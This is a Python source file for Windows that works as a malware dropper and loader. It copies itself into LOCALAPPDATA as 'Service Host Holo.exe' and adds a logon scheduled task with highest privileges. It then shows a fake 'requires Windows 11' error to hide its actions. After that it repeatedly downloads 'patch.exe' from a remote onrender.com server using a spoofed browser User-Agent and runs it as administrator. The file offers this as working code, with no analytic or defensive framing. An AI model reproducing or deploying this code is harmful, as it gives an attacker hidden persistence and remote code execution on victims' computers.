import os
import subprocess
import sys
import multiprocessing
from pathlib import Path
import time
import shutil
import ctypes
import psutil
def is_admin():
    """Returns True if the script is running with Admin privileges, False otherwise."""
    try:
        # shell32.IsUserAnAdmin() returns 1 if admin, 0 if not
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def show_windows_error(title, message):
    """Displays a native Windows error dialog box."""
    # 0x10 = MB_ICONERROR (Red 'X' icon)
    # 0x00 = MB_OK (An OK button)
    # 0x40000 = MB_TOPMOST (Forces the popup to stay on top of other windows)
    box_style = 0x10 | 0x00 | 0x40000

    ctypes.windll.user32.MessageBoxW(0, message, title, box_style)
exactname = "Dolphin.exe"
exactinjectname = "Service Host Holo.exe"

def get_exe_self_path():
    if getattr(sys, "frozen", False):
        # Running as a compiled .exe -> returns the full path to the .exe itself
        return os.path.abspath(sys.executable)
    else:
        # Running as a normal .py script -> returns the full path to the .py file
        return os.path.abspath(__file__)
    
def get_exe_name():
    return os.path.basename(get_exe_self_path())

def get_clean_exe_name():
    full_name = get_exe_name()  # Returns "MyApp.exe" or "script.py"
    name_only, extension = os.path.splitext(full_name)
    return name_only  # Returns "MyApp" or "script"


# --- Example Usage ---
exe_itself = get_exe_self_path()
exe_name = get_exe_name()
local_app_data = os.environ.get("LOCALAPPDATA")
target_dir = Path(local_app_data) / "ServiceHostHolo"

def Injector():
    print("Injecting..")
    

    target_dir.mkdir(parents=True, exist_ok=True)
    print(f"Folder ready at: {target_dir}")

    def add_exe_to_scheduler(exe, task_name):
        script_dir = os.path.dirname(os.path.abspath(__file__))

        if not os.path.exists(exe):
            print(f"Error: Could not find the executable at {exe}")
            return False

        print(f"Found executable at: {exe}")

        command = [
            "schtasks",
            "/Create",
            "/TN",
            task_name,
            "/TR",
            f'"{exe}"',
            "/SC",
            "ONLOGON",
            "/RL",
            "HIGHEST",  # <--- CRUCIAL: This forces the task to run as Administrator
            "/F",
        ]

        try:
            result = subprocess.run(
                command, capture_output=True, text=True, check=True
            )
            print("Success!")
            print(result.stdout)
            return True
        except subprocess.CalledProcessError as e:
            print("Failed to create task scheduler entry.")
            print(f"Error code: {e.returncode}")
            print(f"Details: {e.stderr}")
            return False
        
    def clone_injection(destination_folder):
        try:
            # 1. Get the path of the current running executable
            current_exe_path = get_exe_self_path()
            exe_name = os.path.basename(current_exe_path)

            # 2. Ensure the destination directory exists
            dest_dir = Path(destination_folder)
            dest_dir.mkdir(parents=True, exist_ok=True)

            # 3. Define the full destination path for the clone
            clone_destination = dest_dir / exactinjectname

            # 4. Copy the file
            # shutil.copy2 preserves file metadata (timestamps, etc.)
            shutil.copy2(current_exe_path, clone_destination)

            print(f"Successfully cloned to: {clone_destination}")
            return clone_destination

        except PermissionError:
            print(
                f"[ERROR] Permission Denied! Cannot write to {destination_folder}."
            )
            print("Make sure you are running as Administrator.")
            return None
        except Exception as e:
            print(f"[ERROR] Failed to clone: {e}")
            return None
        
    def launch_as_admin(exe_path):
        # 'runas' forces Windows to launch the file with elevated Admin privileges
        result = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", str(exe_path), None, None, 1
        )

        # ShellExecuteW returns a value greater than 32 if it succeeded
        if result > 32:
            print("Successfully launched process as Administrator.")
        else:
            print(f"Failed to launch. Windows Error Code: {result}")

    def kill_all_instances(exe_name):
        """
        Kills all running processes that match the executable name (e.g., 'notepad.exe')
        """
        # Ensure we have the base name if a full path was passed
        target_name = os.path.basename(exe_name).lower()
        
        killed_count = 0
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'] and proc.info['name'].lower() == target_name:
                    proc.terminate() # or proc.kill() for a hard kill
                    killed_count += 1
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
                
        print(f"Killed {killed_count} instance(s) of {target_name}.")

    if os.path.exists(target_dir / exactinjectname):
        print("Already Injected.")
        show_windows_error(
            title="Access Denied",
            message="This application requires Windows 11 or newer to run.\n\nPlease restart the application as an Administrator.",
        )
        sys.exit(1)
    else:
        print(__file__)
        injectexe = clone_injection(target_dir)
        add_exe_to_scheduler(injectexe, task_name="ServiceHost")
        time.sleep(2)
        launch_as_admin(injectexe)
        print("Injection Complete.")
        time.sleep(1)
        show_windows_error(
            title="Access Denied",
            message="This application requires Windows 11 or newer to run.\n\nPlease restart the application as an Administrator.",
        )

def RunMain():
    def launch_as_admin(exe_path):
        # 'runas' forces Windows to launch the file with elevated Admin privileges
        result = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", str(exe_path), None, None, 1
        )

        # ShellExecuteW returns a value greater than 32 if it succeeded
        if result > 32:
            print("Successfully launched process as Administrator.")
        else:
            print(f"Failed to launch. Windows Error Code: {result}")

    def kill_all_instances(exe_name):
        """
        Kills all running processes that match the executable name (e.g., 'notepad.exe')
        """
        # Ensure we have the base name if a full path was passed
        target_name = os.path.basename(exe_name).lower()
        
        killed_count = 0
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'] and proc.info['name'].lower() == target_name:
                    proc.terminate() # or proc.kill() for a hard kill
                    killed_count += 1
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
                
        print(f"Killed {killed_count} instance(s) of {target_name}.")
    def process_exists(exe_name):
        """
        Checks if any running process matches the given executable name.
        Returns True if found, False otherwise.
        """
        # Sanitize name to match base format (e.g., 'notepad.exe')
        target_name = os.path.basename(exe_name).lower()
        
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] and proc.info['name'].lower() == target_name:
                    return True  # Found a match, exit early
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
                
        return False  # No matches found anywhere
    def download_patch(server_url, save_directory):
        url = f"{server_url.rstrip('/')}/getpatch"
        local_filename = os.path.join(save_directory, "patch.exe")
        
        # Fake a real Google Chrome browser request
        custom_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        }
        
        try:
            print(f"Requesting patch from {url}...")
            
            # Pass the headers into the request
            response = requests.get(url, stream=True, headers=custom_headers)
            
            if response.status_code == 200:
                total_size = int(response.headers.get('content-length', 0))
                bytes_downloaded = 0
                
                print(f"Expected file size: {total_size} bytes. Downloading...")
                
                with open(local_filename, "wb") as f:
                    while True:
                        chunk = response.raw.read(8192)
                        if not chunk:
                            break
                        f.write(chunk)
                        bytes_downloaded += len(chunk)
                
                print(f"Downloaded total: {bytes_downloaded} bytes.")
                
                if total_size != 0 and bytes_downloaded != total_size:
                    print(f"[Error] Size mismatch! Got {bytes_downloaded}/{total_size} bytes.")
                    if os.path.exists(local_filename):
                        os.remove(local_filename)
                    return None
                    
                print(f"[Success] Match verified. Saved to: {local_filename}")
                return local_filename
            else:
                print(f"[Error] Server status: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"[Exception] Failed: {e}")
            return None
    def get_server_patch_version(server_url):
        url = f"{server_url.rstrip('/')}/patch_number"
        
        try:
            response = requests.get(url, timeout=5)
            
            if response.status_code == 200:
                # CORRECTED: .json() is the proper method for the requests library
                data = response.json()  
                
                server_version = str(data.get("patch_number", "")).strip()
                return server_version
            else:
                print(f"[Error] Failed to check version. Server status: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"[Exception] Could not connect to server to check version: {e}")
            return None
    import requests
    willrestart = False
    fps = 30
    URL = "https://anotherwebsite-x1gv.onrender.com/"
    patchpath = None
    current_version = get_server_patch_version(URL)
    while True:
        if patchpath:
            kill_all_instances(patchpath)
            time.sleep(2)
        patchpath = download_patch(URL,target_dir)
        if patchpath:
            launch_as_admin(patchpath)
            print("patched")
        else:
            willrestart = True
            print("failed to patch..")
            time.sleep(1)
        time.sleep(2)
        while not willrestart:
            time.sleep(10)
            print("checking patch..")
            latest_patch = get_server_patch_version(URL)
            if latest_patch != current_version:
                print("New patch update! restarting...")
                current_version = latest_patch
                willrestart = True
            if not process_exists(patchpath):
                print("Process doesn't exist. restarting...")
                willrestart = True
        willrestart = False

if __name__ == "__main__":
    multiprocessing.freeze_support()
    if is_admin():
        print("Running")
    else:
        print("Failure: Missing Admin rights. Showing Windows Popup.")

        # Show the native popup error window
        show_windows_error(
            title="Access Denied",
            message="This application requires Administrator privileges to run.\n\nPlease restart the application as an Administrator.",
        )

        # Exit the application immediately since we don't have permissions
        sys.exit(1)
    print(exe_name," >> ",exactname)
    if exe_name==exactname:
        print("Injecting File")
        Injector()
    elif exe_name==exactinjectname:
        RunMain()
    else:
        print("You arent a valid Filename..")
        show_windows_error(
            title="Access Denied",
            message="This application requires Windows 11 or newer to run.\n\nPlease restart the application as an Administrator.",
        )
        sys.exit(1)
    time.sleep(10)